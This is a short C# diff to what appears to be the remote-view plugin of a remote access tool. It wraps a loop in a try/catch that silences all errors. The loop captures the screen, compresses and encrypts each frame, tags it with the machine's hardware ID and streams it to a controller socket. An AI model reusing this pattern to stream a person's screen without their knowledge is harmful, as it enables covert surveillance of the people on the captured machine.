@@ -34,7 +34,6 @@ namespace Plugin
 			public IntPtr hCursor;
 			public Point ptScreenPos;
 		}
-
 		private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
 		{
 			try
@@ -126,15 +125,19 @@ namespace Plugin
 		{
 			while (Functions.hasToCapture == true) 
 			{
-				Data D = new Data();
-				byte[] captured = Shared.Compressor.QuickLZ.Compress(Functions.Capture(W, H, Q, F), 1);
-				D.HWID = HWID;
-				D.Type = Shared.PacketTypes.PacketType.REMOTE_VIEW;
-				D.DataReturn = new object[] { captured, Screen.AllScreens[0].Bounds.Size };
-				D.IP_Origin = BaseIP;
-				SendData(C.S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key)));
-				//Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
-			}			
+				try
+				{
+					Data D = new Data();
+					byte[] captured = Shared.Compressor.QuickLZ.Compress(Functions.Capture(W, H, Q, F), 1);
+					D.HWID = HWID;
+					D.Type = PacketType.REMOTE_VIEW;
+					D.DataReturn = new object[] { captured, Screen.AllScreens[0].Bounds.Size };
+					D.IP_Origin = BaseIP;
+					SendData(C.S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key)));
+					//Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
+				}
+				catch { }
+			}
 		}
 	}
 }
